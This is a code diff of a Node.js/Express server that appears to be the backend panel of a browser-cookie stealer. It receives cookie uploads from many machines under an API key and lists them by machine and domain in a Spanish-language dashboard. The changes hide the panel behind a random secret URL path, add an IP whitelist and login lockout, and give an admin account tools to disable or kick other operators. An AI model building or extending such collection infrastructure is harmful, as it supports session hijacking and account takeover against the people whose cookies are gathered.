@@ -9,14 +9,31 @@ const API_KEY = process.env.API_KEY || "changeme";
 const DATA_DIR = path.join(__dirname, "data");
 
 // ── Panel users (env: USERS=user1:pass1,user2:pass2) ──
+// First user is ADMIN — can manage accounts
 const USERS = {};
-(process.env.USERS || "admin:admin").split(",").forEach(pair => {
+const DISABLED = new Set();
+let ADMIN_USER = null;
+(process.env.USERS || "admin:admin").split(",").forEach((pair, i) => {
   const [u, p] = pair.split(":");
-  if (u && p) USERS[u.trim()] = p.trim();
+  if (u && p) {
+    USERS[u.trim()] = p.trim();
+    if (i === 0) ADMIN_USER = u.trim();
+  }
 });
+
+// ── IP whitelist (env: ALLOWED_IPS=1.2.3.4,5.6.7.8) ──
+const ALLOWED_IPS = (process.env.ALLOWED_IPS || "").split(",").map(ip => ip.trim()).filter(Boolean);
+
+// ── Secret panel path (env: PANEL_PATH=mysecret) → panel lives at /mysecret/ ──
+const PANEL_PATH = process.env.PANEL_PATH || crypto.randomBytes(12).toString("hex");
 
 // Session tokens (in-memory)
 const sessions = new Map();
+
+// ── Brute force protection ──
+const loginAttempts = new Map(); // ip -> { count, blockedUntil }
+const MAX_ATTEMPTS = 5;
+const BLOCK_MINUTES = 30;
 
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 
@@ -30,6 +47,13 @@ app.use((req, res, next) => {
   next();
 });
 
+// ── Trust proxy (Render uses reverse proxy) ──
+app.set("trust proxy", true);
+
+function getClientIP(req) {
+  return req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip || req.connection.remoteAddress;
+}
+
 // ── Upload auth (API key) ──
 function authUpload(req, res, next) {
   const key = req.headers["x-api-key"] || req.query.key;
@@ -41,32 +65,56 @@ function authUpload(req, res, next) {
 function authPanel(req, res, next) {
   const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
   if (token && sessions.has(token)) return next();
-  // API calls get 401, page requests get redirect
-  if (req.path.startsWith("/api/")) return res.status(401).json({ error: "unauthorized" });
-  res.redirect("/login");
+  if (req.path.startsWith("/" + PANEL_PATH + "/api/")) return res.status(401).json({ error: "unauthorized" });
+  res.redirect("/" + PANEL_PATH + "/login");
 }
 
-// ── Login page ──
-app.get("/login", (req, res) => {
-  res.send(LOGIN_HTML);
+// ── Login page (secret path) ──
+app.get("/" + PANEL_PATH + "/login", (req, res) => {
+  res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login"));
 });
 
-app.post("/login", (req, res) => {
+app.post("/" + PANEL_PATH + "/login", (req, res) => {
+  const ip = getClientIP(req);
+  const record = loginAttempts.get(ip) || { count: 0, blockedUntil: 0 };
+
+  // Blocked?
+  if (record.blockedUntil > Date.now()) {
+    const mins = Math.ceil((record.blockedUntil - Date.now()) / 60000);
+    return res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login").replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Bloqueado. Intentá en ' + mins + ' minutos.</p>'));
+  }
+
   const { username, password } = req.body;
   if (USERS[username] && USERS[username] === password) {
+    // Disabled?
+    if (DISABLED.has(username)) {
+      return res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login").replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Cuenta desactivada</p>'));
+    }
+    loginAttempts.delete(ip);
+    // Kill any existing session for this user (1 session per account)
+    for (const [k, v] of sessions) { if (v.user === username) sessions.delete(k); }
     const token = crypto.randomBytes(32).toString("hex");
-    sessions.set(token, { user: username, created: Date.now() });
+    sessions.set(token, { user: username, created: Date.now(), ip });
     res.setHeader("Set-Cookie", `sid=${token}; Path=/; HttpOnly; SameSite=Strict; Max-Age=604800`);
-    return res.redirect("/");
+    return res.redirect("/" + PANEL_PATH);
   }
-  res.send(LOGIN_HTML.replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Usuario o contraseña incorrectos</p>'));
+
+  // Failed attempt
+  record.count++;
+  if (record.count >= MAX_ATTEMPTS) {
+    record.blockedUntil = Date.now() + BLOCK_MINUTES * 60000;
+    record.count = 0;
+  }
+  loginAttempts.set(ip, record);
+
+  res.send(LOGIN_HTML.replace(/\/login/g, "/" + PANEL_PATH + "/login").replace("<!--ERR-->", '<p style="color:#f85149;margin-top:12px">Usuario o contraseña incorrectos (' + (MAX_ATTEMPTS - record.count) + ' intentos restantes)</p>'));
 });
 
-app.get("/logout", (req, res) => {
+app.get("/" + PANEL_PATH + "/logout", (req, res) => {
   const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
   if (token) sessions.delete(token);
   res.setHeader("Set-Cookie", "sid=; Path=/; Max-Age=0");
-  res.redirect("/login");
+  res.redirect("/" + PANEL_PATH + "/login");
 });
 
 // ── Upload endpoint (API key auth, no session needed) ──
@@ -139,6 +187,55 @@ app.delete("/api/machines", (req, res) => {
   for (const f of files) fs.unlinkSync(path.join(DATA_DIR, f));
   console.log(`[-] Deleted all: ${files.length} machines`);
   res.json({ ok: true, deleted: files.length });
+});
+
+// ── Admin: get current user ──
+app.get("/api/me", (req, res) => {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  const s = sessions.get(token);
+  res.json({ user: s?.user || null, isAdmin: s?.user === ADMIN_USER });
+});
+
+// ── Admin: list sessions ──
+app.get("/api/admin/sessions", (req, res) => {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  const s = sessions.get(token);
+  if (s?.user !== ADMIN_USER) return res.status(403).json({ error: "admin only" });
+  const list = [];
+  for (const [k, v] of sessions) {
+    list.push({ token: k.substring(0, 8) + "...", user: v.user, ip: v.ip || "?", created: new Date(v.created).toISOString() });
+  }
+  res.json({ sessions: list, disabled: [...DISABLED], users: Object.keys(USERS) });
+});
+
+// ── Admin: disable/enable user ──
+app.post("/api/admin/toggle", (req, res) => {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  const s = sessions.get(token);
+  if (s?.user !== ADMIN_USER) return res.status(403).json({ error: "admin only" });
+  const { username } = req.body;
+  if (!USERS[username]) return res.status(404).json({ error: "user not found" });
+  if (username === ADMIN_USER) return res.status(400).json({ error: "cant disable admin" });
+  if (DISABLED.has(username)) {
+    DISABLED.delete(username);
+    res.json({ ok: true, user: username, status: "enabled" });
+  } else {
+    DISABLED.add(username);
+    // Kill their sessions
+    for (const [k, v] of sessions) { if (v.user === username) sessions.delete(k); }
+    res.json({ ok: true, user: username, status: "disabled" });
+  }
+});
+
+// ── Admin: kick a user's session ──
+app.post("/api/admin/kick", (req, res) => {
+  const token = (req.headers.cookie || "").match(/sid=([^;]+)/)?.[1];
+  const s = sessions.get(token);
+  if (s?.user !== ADMIN_USER) return res.status(403).json({ error: "admin only" });
+  const { username } = req.body;
+  let kicked = 0;
+  for (const [k, v] of sessions) { if (v.user === username) { sessions.delete(k); kicked++; } }
+  res.json({ ok: true, kicked });
 });
 
 // ── Panel ──
@@ -242,6 +339,7 @@ button:hover{background:#30363d}
 <div class="tabs">
   <div class="tab active" data-tab="machines" onclick="switchTab('machines')">Máquinas</div>
   <div class="tab" data-tab="cookies" onclick="switchTab('cookies')">Todas las Cookies</div>
+  <div class="tab" data-tab="admin" onclick="switchTab('admin')" id="admin-tab" style="display:none">⚙ Admin</div>
 </div>
 <div class="controls">
   <input type="text" id="search" placeholder="Buscar dominio, cookie o máquina...">
@@ -254,6 +352,7 @@ button:hover{background:#30363d}
 </div>
 <div class="container" id="tab-machines"></div>
 <div class="container hidden" id="tab-cookies"></div>
+<div class="container hidden" id="tab-admin"></div>
 <div id="toast"></div>
 
 <script>
@@ -262,10 +361,10 @@ let MACHINES=[], ALL_COOKIES=[], currentTab="machines";
 async function fetchMachines(){const r=await fetch("/api/machines");if(r.status===401)return location.href="/login";MACHINES=await r.json();const sel=document.getElementById("machine-filter");const prev=sel.value;sel.innerHTML='<option value="all">Todas las máquinas</option>';for(const m of MACHINES)sel.innerHTML+='<option value="'+esc(m.machineId)+'">'+esc(m.machineId)+'</option>';sel.value=prev||"all"}
 async function fetchAllCookies(){const r=await fetch("/api/cookies");if(r.status===401)return location.href="/login";const d=await r.json();ALL_COOKIES=d.cookies}
 
-function switchTab(t){currentTab=t;document.querySelectorAll(".tab").forEach(x=>x.classList.toggle("active",x.dataset.tab===t));document.getElementById("tab-machines").classList.toggle("hidden",t!=="machines");document.getElementById("tab-cookies").classList.toggle("hidden",t!=="cookies");render()}
+function switchTab(t){currentTab=t;document.querySelectorAll(".tab").forEach(x=>x.classList.toggle("active",x.dataset.tab===t));document.getElementById("tab-machines").classList.toggle("hidden",t!=="machines");document.getElementById("tab-cookies").classList.toggle("hidden",t!=="cookies");document.getElementById("tab-admin").classList.toggle("hidden",t!=="admin");render()}
 async function refresh(){await fetchMachines();await fetchAllCookies();render();toast("Actualizado")}
 
-function render(){updateStats();if(currentTab==="machines")renderMachines();else renderCookies()}
+function render(){updateStats();if(currentTab==="machines")renderMachines();else if(currentTab==="admin")renderAdmin();else renderCookies()}
 function updateStats(){document.getElementById("s-machines").textContent=MACHINES.length;document.getElementById("s-total").textContent=ALL_COOKIES.length;document.getElementById("s-domains").textContent=new Set(ALL_COOKIES.map(c=>(c.domain||"").replace(/^\\./,""))).size}
 
 function renderMachines(){
@@ -352,6 +451,60 @@ document.getElementById("search").addEventListener("input",render);
 document.getElementById("sort").addEventListener("change",render);
 document.getElementById("machine-filter").addEventListener("change",()=>render());
 
+// Check if admin
+async function checkAdmin(){
+  const r=await fetch("/api/me");
+  const d=await r.json();
+  if(d.isAdmin)document.getElementById("admin-tab").style.display="";
+}
+
+async function renderAdmin(){
+  const el=document.getElementById("tab-admin");
+  const r=await fetch("/api/admin/sessions");
+  if(r.status===403){el.innerHTML='<div class="empty">Solo admin</div>';return}
+  const d=await r.json();
+  let html='<h2 style="color:#58a6ff;margin-bottom:16px;font-size:18px">Gestión de Cuentas</h2>';
+
+  // Users
+  html+='<div style="margin-bottom:24px">';
+  for(const u of d.users){
+    const dis=d.disabled.includes(u);
+    const isAdmin=u===d.users[0];
+    html+='<div class="machine-card" style="margin-bottom:8px">';
+    html+='<div class="machine-info"><h3 style="font-size:15px">'+esc(u)+(isAdmin?' <span style="color:#3fb950;font-size:11px">ADMIN</span>':'')+'</h3>';
+    html+='<p>Estado: '+(dis?'<span style="color:#f85149">⛔ Desactivada</span>':'<span style="color:#3fb950">✓ Activa</span>')+'</p></div>';
+    html+='<div style="display:flex;gap:8px">';
+    if(!isAdmin){
+      html+='<button class="btn-sm '+(dis?'btn-green':'btn-red')+'" onclick="toggleUser(\\''+esc(u)+'\\')">'+(dis?'Activar':'Desactivar')+'</button>';
+      html+='<button class="btn-sm" onclick="kickUser(\\''+esc(u)+'\\')">Expulsar</button>';
+    }
+    html+='</div></div>';
+  }
+  html+='</div>';
+
+  // Active sessions
+  html+='<h2 style="color:#58a6ff;margin-bottom:16px;font-size:18px">Sesiones Activas</h2>';
+  if(!d.sessions.length){html+='<div class="empty">No hay sesiones activas</div>'}
+  else{
+    html+='<table class="cookie-table" style="display:table"><thead><tr><th>Usuario</th><th>IP</th><th>Desde</th><th>Token</th></tr></thead><tbody>';
+    for(const s of d.sessions){
+      html+='<tr><td style="font-weight:600;color:#58a6ff">'+esc(s.user)+'</td><td>'+esc(s.ip)+'</td><td>'+new Date(s.created).toLocaleString("es-AR")+'</td><td style="color:#484f58">'+esc(s.token)+'</td></tr>';
+    }
+    html+='</tbody></table>';
+  }
+  el.innerHTML=html;
+}
+
+async function toggleUser(u){
+  await fetch("/api/admin/toggle",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u})});
+  toast("Cuenta actualizada");renderAdmin();
+}
+async function kickUser(u){
+  await fetch("/api/admin/kick",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:u})});
+  toast("Sesión expulsada");renderAdmin();
+}
+
+checkAdmin();
 refresh();setInterval(refresh,30000);
 </script>
 </body></html>`;
